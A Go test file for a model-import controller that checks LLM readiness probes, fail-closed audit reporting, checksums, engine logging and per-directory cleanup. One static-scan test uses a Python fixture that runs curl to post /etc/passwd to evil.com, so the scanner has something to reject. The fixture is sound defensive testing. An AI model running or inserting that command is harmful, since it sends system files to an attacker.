package controller

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"log"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/CipherSlinger/teellm"
	"github.com/CipherSlinger/teetls"
	"taa/internal/codeaudit"
)

func TestLLMAvailable(t *testing.T) {
	ready := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/tags":
			_, _ = w.Write([]byte(`{"models":[{"name":"qwen2.5-coder:0.5b"}]}`))
		case "/api/generate":
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte(`{"response":"pong"}`))
		default:
			t.Fatalf("unexpected path = %s", r.URL.Path)
		}
	}))
	defer ready.Close()

	if !llmAvailable(ready.URL, "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = false, want true for ready server")
	}
	if llmAvailable(ready.URL, "nonexistent-model") {
		t.Fatal("llmAvailable = true, want false for missing model")
	}

	corruptModel := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/tags":
			_, _ = w.Write([]byte(`{"models":[{"name":"qwen2.5-coder:0.5b"}]}`))
		case "/api/generate":
			w.WriteHeader(http.StatusInternalServerError)
			_, _ = w.Write([]byte(`{"error":"tensor offset exceeds file size"}`))
		default:
			http.NotFound(w, r)
		}
	}))
	defer corruptModel.Close()
	if llmAvailable(corruptModel.URL, "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = true, want false for corrupt model generate failure")
	}

	down := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer down.Close()
	if llmAvailable(down.URL, "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = true, want false for 500 response")
	}

	if llmAvailable("", "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = true, want false for empty endpoint")
	}
}

// TestLLMAvailableSurvivesAColdModelLoad pins the property both readiness probes
// need: the generate probe is not a ping, it makes the daemon load the model, so
// a daemon that answers tags at once but generate in seconds is a healthy daemon.
// Budgeting the probe like a ping reports the opposite - and because the cutoff
// cancels the load it was waiting on, retrying does not recover.
func TestLLMAvailableSurvivesAColdModelLoad(t *testing.T) {
	const coldLoad = 5 * time.Second

	cold := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/tags":
			_, _ = w.Write([]byte(`{"models":[{"name":"qwen2.5-coder:0.5b"}]}`))
		case "/api/generate":
			select {
			case <-time.After(coldLoad):
				_, _ = w.Write([]byte(`{"response":"pong"}`))
			case <-r.Context().Done():
			}
		default:
			http.NotFound(w, r)
		}
	}))
	defer cold.Close()

	if !llmAvailable(cold.URL, "qwen2.5-coder:0.5b") {
		t.Fatalf("llmAvailable = false for a daemon whose model takes %s to load", coldLoad)
	}
}

type healthCheckFailureLLMClient struct {
	deadline time.Time
	err      error
}

func (c *healthCheckFailureLLMClient) VerifyFinding(context.Context, *teellm.RequestEnvelope) (*teellm.ResponseEnvelope, error) {
	return nil, nil
}

func (c *healthCheckFailureLLMClient) HealthCheck(ctx context.Context) error {
	c.deadline, _ = ctx.Deadline()
	return c.err
}

func (c *healthCheckFailureLLMClient) Close() error {
	return nil
}

func TestIsLLMServiceAvailable_TimeoutAndErrorLog(t *testing.T) {
	const endpoint = "https://127.0.0.1:8443"
	const model = "qwen2.5-coder:3b"
	sentinelErr := errors.New("TEE-TLS health check failed")
	client := &healthCheckFailureLLMClient{err: sentinelErr}

	var logs bytes.Buffer
	previousOutput := log.Writer()
	log.SetOutput(&logs)
	defer log.SetOutput(previousOutput)

	startedAt := time.Now()
	if isLLMServiceAvailable(client, endpoint, model) {
		t.Fatal("isLLMServiceAvailable = true, want false")
	}

	if client.deadline.IsZero() {
		t.Fatal("HealthCheck context did not include a deadline")
	}
	deadlineDuration := client.deadline.Sub(startedAt)
	// The budget is the client's health budget, not an ordinary request timeout:
	// the probe has to outlast a cold model load. Asserted against the constant
	// rather than a literal so the two cannot drift apart.
	if deadlineDuration < auditLLMHealthCheckTimeout-time.Second || deadlineDuration > auditLLMHealthCheckTimeout+time.Second {
		t.Fatalf("health-check deadline duration = %s, want approximately %s", deadlineDuration, auditLLMHealthCheckTimeout)
	}
	// Budgeting the probe like an ordinary request is the defect this guards:
	// it cuts a cold model load off mid-load, and the cutoff cancels the load.
	if auditLLMHealthCheckTimeout <= 30*time.Second {
		t.Fatalf("health-check budget = %s, budgeted like an ordinary request", auditLLMHealthCheckTimeout)
	}

	logText := logs.String()
	for _, expected := range []string{endpoint, model, "timeout=" + auditLLMHealthCheckTimeout.String(), sentinelErr.Error()} {
		if !strings.Contains(logText, expected) {
			t.Errorf("health-check log missing %q: %s", expected, logText)
		}
	}
}

type mockControllerLLMBackend struct {
	healthy bool
}

func (m *mockControllerLLMBackend) HandleVerifyFinding(ctx context.Context, req *teellm.RequestEnvelope) (*teellm.ResponseEnvelope, error) {
	return &teellm.ResponseEnvelope{
		ProtocolVersion: teellm.CurrentProtocolVersion,
		RequestID:       req.RequestID,
		Status:          teellm.StatusSuccess,
		Decision: &teellm.DecisionResult{
			Verdict: teellm.VerdictBenign,
		},
	}, nil
}

func (m *mockControllerLLMBackend) HandleHealthCheck(ctx context.Context) error {
	if !m.healthy {
		return errors.New("backend unhealthy")
	}
	return nil
}

func TestIsLLMServiceAvailable_TEETLS(t *testing.T) {
	mockProv := teetls.NewMockEvidenceProvider()
	tlsCfg := &teetls.Config{
		Mode:             teetls.ModePermissive,
		EvidenceProvider: mockProv,
	}

	backend := &mockControllerLLMBackend{healthy: true}
	server, err := teellm.NewServer(teellm.ServerConfig{
		Addr:    "127.0.0.1:0",
		TEETLS:  tlsCfg,
		Backend: backend,
	})
	if err != nil {
		t.Fatalf("failed to create teellm server: %v", err)
	}
	defer server.Close()

	go func() {
		_ = server.Start()
	}()
	time.Sleep(50 * time.Millisecond)

	cfg := codeaudit.LLMConfig{
		Enabled:            true,
		Transport:          "teetls",
		Endpoint:           "https://" + server.Addr(),
		Model:              "qwen2.5-coder:3b",
		InsecureSkipVerify: true,
		AttestationMode:    "permissive",
	}

	client := newLLMClient(cfg)
	if client == nil {
		t.Fatal("expected newLLMClient to return non-nil client")
	}

	if !isLLMServiceAvailable(client, cfg.Endpoint, cfg.Model) {
		t.Fatal("expected isLLMServiceAvailable = true for healthy TEE-TLS server")
	}

	// Now make backend unhealthy
	backend.healthy = false
	if isLLMServiceAvailable(client, cfg.Endpoint, cfg.Model) {
		t.Fatal("expected isLLMServiceAvailable = false for unhealthy backend")
	}
}

func TestAuditAndReportModelImportFailClosed(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte("import torch\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	// 模拟 LLM 服务不可用（返回 500）。
	llmDown := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer llmDown.Close()

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: true, Endpoint: llmDown.URL, Model: "qwen2.5-coder:0.5b", FailClosed: true}
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 2 {
			t.Fatalf("code = %d, want 2 (fail-closed)", rr.Code)
		}
		if rr.Msg == nil || !strings.Contains(*rr.Msg, "fail-closed") {
			t.Fatalf("msg = %v, want fail-closed message", rr.Msg)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for reportAudit (fail-closed)")
	}
}

func TestAuditAndReportModelImportStaticFail(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := `import subprocess
subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
`
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 1 {
			t.Fatalf("code = %d, want 1 (static audit failure)", rr.Code)
		}
		if rr.Report == "" {
			t.Fatal("report empty, want audit JSON")
		}
		var audit codeaudit.AuditReport
		if err := json.Unmarshal([]byte(rr.Report), &audit); err != nil {
			t.Fatalf("report is not valid audit JSON: %v", err)
		}
		if audit.Conclusion.Passed {
			t.Fatal("conclusion.passed = true, want false")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for reportAudit (static fail)")
	}
}

func TestAuditAndReportModelImportStaticPass(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := "import torch\nimport torch.nn as nn\nmodel = nn.Linear(10, 2)\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false} // 仅静态扫描
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 0 {
			t.Fatalf("code = %d, want 0", rr.Code)
		}
		if rr.Report == "" {
			t.Fatal("report empty, want audit JSON")
		}
		var audit codeaudit.AuditReport
		if err := json.Unmarshal([]byte(rr.Report), &audit); err != nil {
			t.Fatalf("report is not valid audit JSON: %v", err)
		}
		if !audit.Conclusion.Passed {
			t.Fatalf("conclusion.passed = false, want true")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for reportAudit (static pass)")
	}
}

func TestAuditAndReportModelImportIncludesChecksum(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := "import torch\nimport torch.nn as nn\nmodel = nn.Linear(10, 2)\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportModelImportEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"
	state.setModelChecksum(map[string]any{
		"size":      int64(9999),
		"algorithm": "sm3",
		"value":     "sm3-model-hash-12345",
	})

	state.reportModelImportAsync("req-1", "task-1", 0, "模型导入成功")

	select {
	case rr := <-received:
		if rr.Code != 0 {
			t.Fatalf("code = %d, want 0", rr.Code)
		}
		if rr.Checksum == nil {
			t.Fatalf("expected Checksum to be included in reportModelImport, got nil")
		}
		if rr.Checksum["algorithm"] != "sm3" || rr.Checksum["value"] != "sm3-model-hash-12345" || int64(rr.Checksum["size"].(float64)) != 9999 {
			t.Fatalf("unexpected checksum: %+v", rr.Checksum)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for reportModelImport")
	}
}

func TestAuditAndReportModelImportFallbackDirectoryChecksum(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := "import torch\nimport torch.nn as nn\nmodel = nn.Linear(10, 2)\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportModelImportEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"
	// ModelChecksum is nil, should fallback to calculating directory checksum

	state.reportModelImportAsync("req-1", "task-1", 0, "模型导入成功")

	select {
	case rr := <-received:
		if rr.Code != 0 {
			t.Fatalf("code = %d, want 0", rr.Code)
		}
		if rr.Checksum == nil {
			t.Fatalf("expected Checksum to be calculated from modelDir and included, got nil")
		}
		if rr.Checksum["algorithm"] != "sm3" {
			t.Fatalf("checksum algorithm = %v, want sm3", rr.Checksum["algorithm"])
		}
		if rr.Checksum["value"] == "" || rr.Checksum["value"] == "N/A" {
			t.Fatalf("checksum value is empty or N/A: %+v", rr.Checksum)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for reportModelImport")
	}
}

// namedEngine is a StaticEngine whose name the test chooses while the scanning
// stays the real baseline engine's. The assertion below is about where the logged
// name comes from, not about which engine scans better: a double that answers
// "semgrep" to Name() separates "the log prints the configured engine" from "the
// log prints a constant" without making this test depend on a semgrep binary. It
// does not pretend to scan the way semgrep does, and nothing here reads a finding
// it produced.
type namedEngine struct {
	codeaudit.StaticEngine
	name string
}

func (e namedEngine) Name() string { return e.name }

// TestAuditStartLogNamesTheEngine pins that the audit-start line says which Tier 1
// engine is about to scan. That line is what an operator reads to attribute a
// blocked import, and "the audit ran" stopped being enough once two engines
// became selectable: a report that proves which engine produced it is only useful
// if the log the operator is looking at names the same one.
//
// The second case is the one that keeps the line honest. A state can be built
// without an engine, and the log is written before the audit's own nil check, so
// an unguarded Name() call would turn a configuration error into a panic inside
// the audit path — the failure the fail-closed design exists to avoid.
func TestAuditStartLogNamesTheEngine(t *testing.T) {
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	for _, tc := range []struct {
		name   string
		engine codeaudit.StaticEngine
		want   string
	}{
		{"the configured engine", namedEngine{StaticEngine: codeaudit.DefaultEngine(), name: "semgrep"}, "engine=semgrep"},
		{"no engine configured", nil, "engine=unset"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			state, _ := setupTestState(t)
			modelDir := t.TempDir()
			if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte("import torch\n"), 0o644); err != nil {
				t.Fatal(err)
			}

			state.Security.ScanEnabled = true
			state.Security.Engine = tc.engine
			state.Security.ModelDir = modelDir
			state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
			state.PlatformIP = platform.URL
			state.DockerID = "docker-test"

			state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

			var startLine string
			for _, entry := range state.Logs.All() {
				if strings.Contains(entry.Message, "开始代码审计") {
					startLine = entry.Message
					break
				}
			}
			if startLine == "" {
				t.Fatalf("no audit-start line among %d log entries", len(state.Logs.All()))
			}
			if !strings.Contains(startLine, tc.want) {
				t.Errorf("audit-start line = %q, want it to contain %q", startLine, tc.want)
			}
		})
	}
}

// TestAuditAndReportModelImportClearsOnlyTheTriggeringSide pins the semantics this task
// introduces for the model path: the returned bool is TriggerClean, not "the audit
// passed". The model code here is benign and the only findings sit under the dependency
// root, so the combined audit fails and must be reported as code=1 under the model scope
// -- while the model side, which the failure does not implicate, is left in place for
// training. Rolling the model back over a dependency-side finding is the regression this
// test guards.
//
// Both roots are made real: a ModelDir with benign code, and a bound dependency
// directory holding a file that matches a HIGH rule, so the audit has a genuine failure
// on one side and a genuine pass on the other.
func TestAuditAndReportModelImportClearsOnlyTheTriggeringSide(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	state.Security.Engine = codeaudit.DefaultEngine()

	modelFile := writePythonFile(t, state.Security.ModelDir, "train.py", benignPython)
	state.updateImportState(true, true, 1)
	// The bound dependency directory is the "other side"; its rule-matching file is the
	// only reason the combined audit fails.
	depsDir := bindDepsDir(t, state, "boundset", ruleMatchingPython)

	received := make(chan combinedAuditCapture, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr combinedAuditCapture
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	triggerClean := state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})
	if !triggerClean {
		t.Fatal("auditAndReportModelImport = false while the only findings sit under the dependency root: the model side was implicated by a failure that is not its own")
	}

	// The delivered side is not cleared: the imported model code is still on disk.
	if _, err := os.Stat(modelFile); err != nil {
		t.Fatalf("the delivered model file was removed though the model side was unimplicated: %v", err)
	}

	select {
	case rr := <-received:
		if rr.Code != 1 {
			t.Fatalf("code = %d, want 1 (the combined audit as a whole failed)", rr.Code)
		}
		if rr.Scope != "" {
			t.Fatalf("scope = %q, want \"\" for a model-side trigger", rr.Scope)
		}
		if rr.Report == "" {
			t.Fatal("report empty, want the combined audit JSON")
		}
		// Decoded a second time: the report field is the projection JSON-encoded into a
		// string, so only the decoded payload names which root failed.
		roots := projectedRoots(t, rr)
		if len(roots) != 2 {
			t.Fatalf("projected roots = %+v, want the model root and the dependency root", roots)
		}
		if roots[0].Directory != state.Security.ModelDir {
			t.Fatalf("first root = %q, want the model directory %q", roots[0].Directory, state.Security.ModelDir)
		}
		if roots[1].Directory != depsDir {
			t.Fatalf("second root = %q, want the dependency directory %q", roots[1].Directory, depsDir)
		}
		if !roots[0].Passed {
			t.Errorf("the model root reported passed = false in an audit whose only findings are under the dependency root")
		}
		if roots[1].Passed {
			t.Errorf("the dependency root reported passed = true while it holds the rule-matching file")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for reportAudit (model trigger, dependency-only failure)")
	}
}

// TestAuditAndReportModelImportExecutionFailureClearsTheModel pins spec 3.5's last row
// for the model trigger: an audit that fails to execute carries no verdict, and under
// fail-closed the delivered side is cleared anyway. The model directory is emptied (and
// kept) while the dependency root -- scanned by the same run but never delivered by this
// trigger -- is left alone.
//
// This is the row most likely to regress silently. The failure emits no report at all, so
// nothing in the payload records which side was cleared; only the directory on disk does.
// The LLM-unavailable path is how the executor reaches code=2, and it routes through
// TriggerClean == false exactly like a failing scan, which is what collapses the old
// three cleanDirContents sites into the one gate.
func TestAuditAndReportModelImportExecutionFailureClearsTheModel(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true
	state.Security.Engine = codeaudit.DefaultEngine()
	// LLM enabled and fail-closed against a dead endpoint: the readiness probe fails, so
	// the audit never produces a verdict and the executor reports code=2.
	state.Security.LLM = codeaudit.LLMConfig{Enabled: true, FailClosed: true, Endpoint: "http://127.0.0.1:1", Model: "qwen2.5-coder:0.5b"}

	writePythonFile(t, state.Security.ModelDir, "train.py", benignPython)
	state.updateImportState(true, true, 1)
	depsDir := bindDepsDir(t, state, "boundset", benignPython)

	received := make(chan combinedAuditCapture, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr combinedAuditCapture
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	triggerClean := state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})
	if triggerClean {
		t.Fatal("auditAndReportModelImport = true for an audit that never produced a verdict: fail-closed must clear the delivered side")
	}

	// The delivered directory is emptied but kept: a rejected model must not stay on disk.
	entries, err := os.ReadDir(state.Security.ModelDir)
	if err != nil {
		t.Fatalf("read model dir: %v", err)
	}
	if len(entries) != 0 {
		t.Fatalf("model dir holds %d entries after a failed-to-execute audit, want it emptied", len(entries))
	}

	// The dependency root is untouched: this trigger did not deliver it.
	if _, err := os.Stat(filepath.Join(depsDir, "pkg.py")); err != nil {
		t.Fatalf("dependency directory was cleared by a model-trigger execution failure: %v", err)
	}

	select {
	case rr := <-received:
		if rr.Code != 2 {
			t.Fatalf("code = %d, want 2 (audit failed to execute)", rr.Code)
		}
		if rr.Scope != "" {
			t.Fatalf("scope = %q, want \"\" for a model-side trigger", rr.Scope)
		}
		if rr.Report != "" {
			t.Fatalf("report = %q, want empty for an audit that did not execute", rr.Report)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for reportAudit (model trigger, execution failure)")
	}
}
